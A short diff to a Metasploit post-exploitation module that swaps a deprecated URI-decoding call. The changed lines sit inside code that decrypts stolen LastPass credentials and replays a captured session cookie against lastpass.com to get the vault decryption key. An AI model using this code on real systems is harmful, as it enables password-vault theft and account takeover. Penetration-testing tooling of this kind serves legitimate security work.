@@ -330,12 +330,12 @@ class MetasploitModule < Msf::Post
           unless ieffcreds.blank?
             ieffcreds.each do |creds|
               if creds[1].blank? # No master password found
-                account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = { 'lp_password' => nil }
+                account_map[account][browser]['lp_creds'][URI.decode_uri_component(creds[0])] = { 'lp_password' => nil }
               else
-                sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(URI.unescape(creds[0]))
+                sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(URI.decode_uri_component(creds[0]))
                 sha256_binary_email = [sha256_hex_email].pack 'H*' # Do hex2bin
-                creds[1] = decrypt_data(sha256_binary_email, URI.unescape(creds[1]))
-                account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = { 'lp_password' => creds[1] }
+                creds[1] = decrypt_data(sha256_binary_email, URI.decode_uri_component(creds[1]))
+                account_map[account][browser]['lp_creds'][URI.decode_uri_component(creds[0])] = { 'lp_password' => creds[1] }
               end
             end
           end
@@ -551,7 +551,7 @@ class MetasploitModule < Msf::Post
       # Use the cookie to obtain the encryption key to decrypt the vault key
       uri = URI('https://lastpass.com/login_check.php')
       request = Net::HTTP::Post.new(uri)
-      request.set_form_data('wxsessid' => URI.unescape(session_cookie_value), 'uuid' => browser_map['lp_2fa'])
+      request.set_form_data('wxsessid' => URI.decode_uri_component(session_cookie_value), 'uuid' => browser_map['lp_2fa'])
       request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
       response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) { |http| http.request(request) }
 
